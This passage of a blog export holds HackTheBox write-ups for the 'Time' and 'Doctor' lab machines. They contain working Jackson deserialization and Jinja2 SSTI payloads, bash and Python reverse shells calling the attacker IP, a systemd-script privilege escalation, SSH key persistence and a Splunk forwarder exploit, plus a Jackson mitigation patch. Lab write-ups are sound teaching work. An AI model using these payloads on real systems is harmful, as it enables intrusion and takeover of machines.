world-writable, allowing me to inject a malicious code and obtain a root shell.\nSkills Learned   Deserialization Attack on Jackson (CVE-2019-12384)\n  Exploiting Systemd timers\nMitigation of CVE-2019-12384\n  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux  Reconnaissance Nmap nmap discovers two open ports: SSH on port 22, and a HTTP web server on port 80.\n→ root@kali «time» «10.10.14.19» $ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-08 07:29 EDT Nmap scan report for 10.10.10.214 Host is up (0.069s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds Enumeration TCP 80 - Website Visiting port 80 shows a website called \u0026ldquo;Online JSON Beautifier \u0026amp; Validator\u0026rdquo;.\nClicking on the drop down menu, it provides two options: \u0026ldquo;Beautify\u0026rdquo; and \u0026ldquo;Validate (beta!)\u0026rdquo;.\nTesting Inputs I submitted {\u0026quot;test\u0026quot;: \u0026quot;iamf\u0026quot;} to the input box and clicked the \u0026ldquo;Process\u0026rdquo; button. As expected, the beautify option just a JSON beautifier like jq.\nI submitted the same input on \u0026ldquo;Validate (beta!)\u0026rdquo;, but this time it returns the following error.\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object I found this site while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.\n[ \u0026#34;org.baeldung.jackson.inheritance.Truck\u0026#34;, { \u0026#34;make\u0026#34;: \u0026#34;Isuzu\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;NQR\u0026#34;,\u0026#34;payloadCapacity\u0026#34;: 7500.0 } ] And now it returns a different error message.\nAnd that\u0026rsquo;s because it probably can\u0026rsquo;t find org.baeldung.jackson.inheritance.Truck since I made it up.\nFinding Vulnerability I might be able to inject the \u0026ldquo;org.baeldung.jackson.inheritance.Truck\u0026rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:\n Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill Jackson gadgets - Anatomy of a vulnerability · Doyensec\u0026rsquo;s Blog  However, the post on Doyensec\u0026rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses ch.qos.logback.core.db.DriverManagerConnectionSource as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.\nBelow is the example payload used.\n[\u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, {\u0026#34;url\u0026#34;:\u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://localhost:8000/inject.sql\u0026#39;\u0026#34;}] Foothold Shell as pericles Exploiting Jackson CVE-2019-12384 I\u0026rsquo;ll use the research from Doyensec\u0026rsquo;s blog above as my reference.\nFirst, I\u0026rsquo;ll create a copy of the inject.sql file that is used by the researcher.\ninject.sql:\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;id \u0026gt; /dev/tcp/10.10.14.19/9000\u0026#39;) Then, I\u0026rsquo;ll setup a Python web server to host the SQL file and an nc listener to catch the request.\n→ root@kali «time» «10.10.14.19» $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now I\u0026rsquo;ll use the following JSON payload and submit it to the validator.\n[\u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, {\u0026#34;url\u0026#34;:\u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://10.10.14.19/inject.sql\u0026#39;\u0026#34;}] Within a few seconds, my Python web server receives a request for inject.sql, and my listener captures the output of the id command.\nKnowing this, I can weaponize the inject.sql file to send myself a shell, and then perform the same procedure as above.\nWeaponization - Reverse Shell Now with the following inject.sql,\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.19/9000 0\u0026gt;\u0026amp;1\u0026#39;) I can obtain an interactive shell.\n→ root@kali «time» «10.10.14.19» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496 bash: cannot set terminal process group (944): Inappropriate ioctl for device bash: no job control in this shell pericles@time:/var/www/html$ Upgrade to SSH With current access, I can put my public key to the authorized_keys file.\npericles@time:/home/pericles$ mkdir .ssh pericles@time:/home/pericles$ pericles@time:/home/pericles$ echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; .ssh/authorized_keys Now I can login as pericles with my SSH private key.\n→ root@kali «time» «10.10.14.19» $ ssh pericles@10.10.10.214 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.0 Usage of /: 21.2% of 27.43GB Memory usage: 16% Swap usage: 0% Processes: 235 Users logged in: 0 IPv4 address for ens160: 10.10.10.214 IPv6 address for ens160: dead:beef::250:56ff:feb9:a553 ...\u0026lt;SNIP\u0026gt;... Last login: Fri Oct 23 09:19:19 2020 from 10.10.14.5 pericles@time:~$ id uid=1000(pericles) gid=1000(pericles) groups=1000(pericles) Privilege Escalation Shell as root Internal Enumeration pericles is the only user on this box.\npericles@time:/home/pericles$ cat /etc/passwd | grep sh$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash While searching files owned by pericles, I spotted a script called timer_backup.sh.\npericles@time:~$ find / -type f -user pericles 2\u0026gt;/dev/null |grep -v \u0026#39;proc\\|sys\u0026#39; /usr/bin/timer_backup.sh /dev/shm/payloadds9LXy /home/pericles/.gnupg/trustdb.gpg /home/pericles/.gnupg/pubring.kbx /home/pericles/.bashrc ...\u0026lt;SNIP\u0026gt;... The script is backing up the website contents in /var/www/html to the root home directory.\npericles@time:~$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html \u0026amp;\u0026amp; mv website.bak.zip /root/backup.zip Interestingly, that script is writable by others.\npericles@time:~$ ls -l /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 88 Apr 10 21:05 /usr/bin/timer_backup.sh I searched other file related to the script, and found out there is a timer owned by root.\npericles@time:~$ find / -type f -name \u0026#34;timer_backup*\u0026#34; -ls 2\u0026gt;/dev/null 795750 4 -rw-r--r-- 1 root root 214 Oct 23 06:46 /etc/systemd/system/timer_backup.timer 787186 4 -rw-r--r-- 1 root root 159 Oct 23 05:59 /etc/systemd/system/timer_backup.service 1317302 4 -rwxrw-rw- 1 pericles pericles 88 Apr 10 21:10 /usr/bin/timer_backup.sh timer_backup.timer requires timer_backup.service,\npericles@time:~$ cat /etc/systemd/system/timer_backup.timer [Unit] Description=Backup of the website Requires=timer_backup.service [Timer] Unit=timer_backup.service #OnBootSec=10s #OnUnitActiveSec=10s OnUnitInactiveSec=10s AccuracySec=1ms [Install] WantedBy=timers.target and what timer_backup.service doing is it restarts web_backup.service.\npericles@time:~$ cat /etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service web_backup.service executes the timer_backup.sh script which is owned by pericles.\npericles@time:~$ cat /etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh Exploiting timer_backup.sh With writable access, I can put a bash reverse shell in timer_backup.sh, and then setup a nc listener.\npericles@time:~$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.19/9002 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /usr/bin/timer_backup.sh pericles@time:~$ pericles@time:~$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html \u0026amp;\u0026amp; mv website.bak.zip /root/backup.zip bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.72/9002 0\u0026gt;\u0026amp;1 Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.\n→ root@kali «time» «10.10.14.19» $ rlwrap nc -nvlp 9002 listening on [any] 9002 ... connect to [10.10.14.72] from (UNKNOWN) [10.10.10.214] 57648 bash: cannot set terminal process group (411032): Inappropriate ioctl for device bash: no job control in this shell root@time:/# root@time:/# exit So I repeated the steps, but this time, I immediately injected my public key to the root\u0026rsquo;s authorized_keys file.\n→ root@kali «time» «10.10.14.19» $ nc -nvlp 9002 listening on [any] 9002 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 34182 bash: cannot set terminal process group (65312): Inappropriate ioctl for device bash: no job control in this shell root@time:/# echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; /root/.ssh/authorized_keys \u0026lt;rj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; /root/.ssh/authorized_keys root@time:/# exit After that, I can login as root via SSH.\n→ root@kali «time» «10.10.14.19» $ ssh root@10.10.10.214 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.0 Usage of /: 21.2% of 27.43GB Memory usage: 16% Swap usage: 0% Processes: 235 Users logged in: 0 IPv4 address for ens160: 10.10.10.214 IPv6 address for ens160: dead:beef::250:56ff:feb9:a553 ...\u0026lt;SNIP\u0026gt;... Last login: Tue Feb 9 14:41:33 2021 root@time:~# id uid=0(root) gid=0(root) groups=0(root) root@time:~# cut -c-16 root.txt 27375f967f43232f Extras In this extras, I\u0026rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I\u0026rsquo;ll try to patch it.\nCVE-2019-12384 Causes According to this site, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.\nThe first condition is fulfilled by the index.php file (/var/www/html/index.php). I have control on the user input.\n\u0026lt;?php if(isset($_POST[\u0026#39;data\u0026#39;])){ if(isset($_POST[\u0026#39;mode\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;mode\u0026#39;] === \u0026#34;2\u0026#34;){ $filename = tempnam(\u0026#34;/dev/shm\u0026#34;, \u0026#34;payload\u0026#34;); $myfile = fopen($filename, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $txt = $_POST[\u0026#39;data\u0026#39;]; // Condition #1, $txt controlled by user. no filter  fwrite($myfile, $txt); fclose($myfile); exec(\u0026#34;/usr/bin/jruby /opt/json_project/parse.rb $filename2\u0026gt;\u0026amp;1\u0026#34;, $cmdout, $ret); unlink($filename); if($ret === 0){ $output = \u0026#39;\u0026lt;pre\u0026gt;Validation successful!\u0026lt;/pre\u0026gt;\u0026#39;; } else{ $output = \u0026#39;\u0026lt;pre\u0026gt;Validation failed: \u0026#39; . $cmdout[1] . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } else{ $json_ugly = $_POST[\u0026#39;data\u0026#39;]; $json_pretty = json_encode(json_decode($json_ugly), JSON_PRETTY_PRINT); $output = \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;.$json_pretty.\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt;...\u0026lt;SNIP\u0026gt;... The second condition fulfilled by the parser itself (/opt/json_project/parse.rb). It uses \u0026ldquo;Default typing\u0026rdquo;.\nrequire \u0026#39;java\u0026#39; Dir[\u0026#34;/opt/json_project/classpath/*.jar\u0026#34;].each do |f| require f end java_import \u0026#39;com.fasterxml.jackson.databind.ObjectMapper\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.SerializationFeature\u0026#39; f = File.read(ARGV[0]) content = f puts content mapper = ObjectMapper.new mapper.enableDefaultTyping() # Condition #2, the uses of \u0026#34;default typing\u0026#34;. mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false); obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters puts \u0026#34;stringified: \u0026#34; + mapper.writeValueAsString(obj) The third condition is fulfilled by logback-core-1.3.0-alpha5.jar as the gadget class and h2–1.4.199.jar for the RCE capability. According to this blog, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.\nroot@time:/opt/json_project# grep -Ri version Binary file classpath/h2-1.4.199.jar matches Binary file classpath/jackson-databind-2.9.8.jar matches Binary file classpath/logback-core-1.3.0-alpha5.jar matches Binary file classpath/jackson-core-2.9.8.jar matches Mitigation After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of parse.rb:\nrequire \u0026#39;java\u0026#39; Dir[\u0026#34;/opt/json_project/classpath/*.jar\u0026#34;].each do |f| require f end java_import \u0026#39;com.fasterxml.jackson.databind.ObjectMapper\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.SerializationFeature\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.MapperFeature\u0026#39; # ==\u0026gt; Mitigation v2.11  f = File.read(ARGV[0]) content = f puts content mapper = ObjectMapper.new mapper.activateDefaultTyping() # ==\u0026gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping()  mapper.configure(MapperFeature::BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES); # ==\u0026gt; Mitigation v2.11  mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false); obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters puts \u0026#34;stringified: \u0026#34; + mapper.writeValueAsString(obj) I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed from Time where the updated parser and the newer version of Jackson are hosted from my machine.\n#!/bin/bash # ./time.sh patch [ip] project_path=\u0026#34;/opt/json_project/\u0026#34; new_jackson=\u0026#34;jackson-core-2.11.0.jar\u0026#34; old_jackson=\u0026#34;jackson-core-2.9.8.jar\u0026#34; if [ \u0026#34;$1\u0026#34; == \u0026#34;patch\u0026#34; ]; then # backup the original code mkdir -p /dev/shm/orig/ mv $project_path\u0026#34;classpath/\u0026#34;$old_jackson /dev/shm/orig/ mv $project_path\u0026#34;parse.rb\u0026#34; /dev/shm/orig/ # These file hosted from my machine curl -s \u0026#34;http://$2/$new_jackson\u0026#34; \u0026gt; /tmp/$new_jackson curl -s \u0026#34;http://$2/parse.rb\u0026#34; \u0026gt; /tmp/parse.rb # move the updated parser and jackson cp /tmp/$new_jackson $project_path\u0026#34;classpath/\u0026#34;$new_jackson cp /tmp/parse.rb \u0026#34;$project_path\u0026#34; chmod +x $project_path\u0026#34;parse.rb\u0026#34; elif [ \u0026#34;$1\u0026#34; == \u0026#34;restore\u0026#34; ]; then rm $project_path\u0026#34;classpath/\u0026#34;$new_jackson rm $project_path\u0026#34;parse.rb\u0026#34; mv \u0026#34;/dev/shm/orig/$old_jackson\u0026#34; $project_path\u0026#34;classpath/\u0026#34; mv \u0026#34;/dev/shm/orig/parse.rb\u0026#34; $project_path rm /tmp/$new_jackson rm /tmp/parse.rb rm -r /dev/shm/orig/ fi I tried to exploit the validator again by reproducing the same steps as in the Foothold section, but this time my reverse shell didn’t connect back. I checked the validator on the browser, and now it returned this message.\nValidation failed: WARNING: An illegal reflective access operation has occurred Well, it is working, isn’t it?\n References Exploitation:\n https://blog.doyensec.com/2019/07/22/jackson-gadgets.html https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html  Mitigation:\n https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062 https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-time/","summary":"Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I\u0026rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds.","tags":["OSCP-like","Linux","Jackson","Java","SSRF","Deserialization","CVE-2019-12384","Systemd-timer","Code-review","Code-patching"],"title":"HackTheBox - Time"},{"content":"Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I\u0026rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user\u0026rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.\nSkills Learned  Server Side Template Injection Splunk UF Exploitation  Tools   Kali Linux (Attacking Machine) - https://www.kali.org/\n  Nmap - Preinstalled in Kali Linux\n  Gobuster - https://github.com/OJ/gobuste\n  Tplmap - https://github.com/epinna/tplmap\n  SSTI Cheatsheet - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#\n  PySplunkWhisperer2 - https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py\n  Reconnaissance Nmap An initial scans discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.\n→ root@kali «exploits» «10.10.14.3» $ mkdir nmap; nmap -sC -sV -oN nmap/initial-doctor \u0026#39;10.10.10.209\u0026#39; Nmap scan report for 10.10.10.209 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-methods: |_ Supported Methods: GET HEAD OPTIONS | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-06T15:57:27 | Not valid after: 2023-09-06T15:57:27 | MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787 |_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration TCP 80 - Website This page shows a kind of health service website called \u0026ldquo;Doctor\u0026rdquo; in the title.\nGobuster URL brute force with gobuster didn\u0026rsquo;t find any interesting results.\n/images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.209/images/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.209/js/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.209/css/] /contact.html (Status: 200) [Size: 19848] /blog.html (Status: 200) [Size: 19848] /about.html (Status: 200) [Size: 19848] /index.html (Status: 200) [Size: 19848] /services.html (Status: 200) [Size: 19848] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.209/fonts/] /departments.html (Status: 200) [Size: 19848] /server-status (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 19848] TCP 80 - doctors.htb Because adding a machine name with \u0026ldquo;.htb\u0026rdquo; as TLD to /etc/hosts file has become my habit (i.e doctor.htb), so at first, on the homepage, I didn\u0026rsquo;t notice that there is an additional \u0026ldquo;s\u0026rdquo; on info@doctors.htb.\nOnce I added doctors.htb to my /etc/hosts file, I refreshed the page with that hostname, and it presented a different web application.\nIn the page source, I found a comment telling that the archive feature is still in beta testing.\nI\u0026rsquo;ll note that /archive.\nGobuster I ran another gobuster scan, but it seems I\u0026rsquo;ll just register an account this time.\n/logout (Status: 302) [Size: 217] [--\u0026gt; http://doctors.htb/home] /register (Status: 200) [Size: 4493] /login (Status: 200) [Size: 4204] /home (Status: 302) [Size: 245] [--\u0026gt; http://doctors.htb/login?next=%2Fhome] /archive (Status: 200) [Size: 101] /account (Status: 302) [Size: 251] [--\u0026gt; http://doctors.htb/login?next=%2Faccount] /server-status (Status: 403) [Size: 276] My account is only available for 20 minutes.\nThe \u0026ldquo;1\u0026rdquo; icon was actually a page number with URL of http://doctors.htb/home?page=1.\nTCP 8089 — Splunk Universal Forwarder I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.\nAt the top, I can see the Splunk version.\nFinding vulnerability Knowing the version, I did a quick search on Google to look for available exploits, and I came across hackbooktriks.xyz\n https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence  The original research was published in here:\n https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/  But it requires credentials. I\u0026rsquo;ll just add this to my to do list.\nFoothold Shell as web SQL Injection - Failed I can create a post message on doctors.htb by visiting http://doctors.htb/post/new. Below is the example request\nPOST /post/new HTTP/1.1 Host: doctors.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://doctors.htb/post/new Content-Type: application/x-www-form-urlencoded Content-Length: 35 Connection: close Cookie: session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34 Upgrade-Insecure-Requests: 1 title=test\u0026amp;content=test\u0026amp;submit=Post I fed the request to SQLMap, but it doesn\u0026rsquo;t seem injectable.\nAnd then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows doctors.htb uses Flask as its backend.\nServer Side Template Injection (SSTI) Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.\n PwnFunction’s video on SSTI was very informative.\nTryHackMe also has a room called “Flask” that contains an example of SSTI attack on Flask. I have completed that room, and the note is available on my GitHub.\n Here is the methodology to detect SSTI (taken from here):\nhttp://doctors.htb/home?page=1 is the first attack surface to target. I used a tool called Tplmap.py to automatically detect SSTI, but no luck.\n→ root@kali «exploits» «10.10.14.3» $ python tplmap.py -u \u0026#39;http://doctors.htb/home?page=iamf\u0026#39; [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter \u0026#39;page\u0026#39; is injectable [+] Smarty plugin is testing rendering with tag \u0026#39;*\u0026#39; [+] Smarty plugin is testing blind injection ...\u0026lt;SNIP\u0026gt;... [+] Ruby plugin is testing blind injection [+] Ejs plugin is testing rendering with tag \u0026#39;*\u0026#39; [+] Ejs plugin is testing blind injection [!][checks] Tested parameters appear to be not injectable. The second attack surface is http://doctors.htb/post/new, which allows me to create a post message. It consists of two input vectors: the title and the content/message.\nI copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn\u0026rsquo;t return the expected result.\nIt returns nothing as well when I submit the payloads on the title.\nAfter hours trying to figure out why it doesn\u0026rsquo;t work, I noticed that the /archive page occasionally returns an error after I put some payload that has the percentage symbol {% payload %} on the content/message section.\nOr sometimes it only has the post title that can be seen only from page source.\nSo from there, I submitted the basic payload on the title.\nRight after inserting the payload, I checked the page source of /archive, and I found the SSTI expected result there.\nReverse Shell The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my nc listener listening on the port I specified.\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026#34;warning\u0026#34; in x.__name__ %}{{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.14.4\\\u0026#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\u0026#34;)}}{%endif%}{% endfor %} I have an interactive shell now.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.34] from (UNKNOWN) [10.10.10.209] 5628 /bin/sh: 0: can’t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; web@doctor:~$ id uid=1001(web) gid=1001(web) groups=1001(web),4(adm) Privilege Escalation Shell as shaun Internal Enumeration These are the users who a shell.\nweb@doctor:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash web:x:1001:1001:,,,:/home/web:/bin/bash shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash Because web is a member of the adm group, I can read the log files at /var/log. While enumerating with find command, I caught an Apache2 log called \u0026ldquo;backup\u0026rdquo;.\nweb@doctor:~$ find / -type f -readable -group adm 2\u0026gt;/dev/null /var/log/kern.log.3.gz /var/log/auth.log /var/log/syslog /var/log/ufw.log.2.gz /var/log/dmesg.2.gz /var/log/auth.log.1 ...\u0026lt;SNIP\u0026gt;... /var/log/apache2/backup Searching string \u0026ldquo;pass\u0026rdquo; on the backup log finds this line.\nweb@doctor:/var/log/apache2$ cat backup | grep pass 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \u0026#34;POST /reset_password?email=Guitar123\u0026#34; 500 453 \u0026#34;http://doctor.htb/reset_password\u0026#34; It printed as email=Guitar123, but it doesn\u0026rsquo;t look like an email.\nSU - shaun It turns out that Guitar123 is shaun\u0026rsquo;s password.\nweb@doctor:/var/log/apache2$ su shaun Password: Guitar123 web@doctor:/var/log/apache2$ id uid=1002(shaun) gid=1002(shaun) groups=1002(shaun) User flag is done here.\nShell as root Exploiting Splunk with PySplunkWhisperer2 Recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.\nThe researcher stated that the Splunk UF agent\u0026rsquo;s username is always admin.\n Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 \u0026hellip;\n But that\u0026rsquo;s not the case on this machine, because I can use shaun:Guitar123 to authenticate to the Splunk UF services on port 8089.\nI tried this PoC from GitHub using the bash reverse shell as payload,\n→ root@kali «exploits» «10.10.14.3» $ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.3/9001 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; --lhost 10.10.14.3 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpkwnss3rw.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.3:8181/ 10.10.10.209 - - [03/Feb/2021 05:09:23] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - [+] App installed, your code should be running now! and it worked smoothly.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.209] 48834 bash: cannot set terminal process group (1137): Inappropriate ioctl for device bash: no job control in this shell root@doctor:/# id id uid=0(root) gid=0(root) groups=0(root) I can grab the root flag.\n References  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 https://www.youtube.com/watch?v=SN6EVIG4c-0 https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/  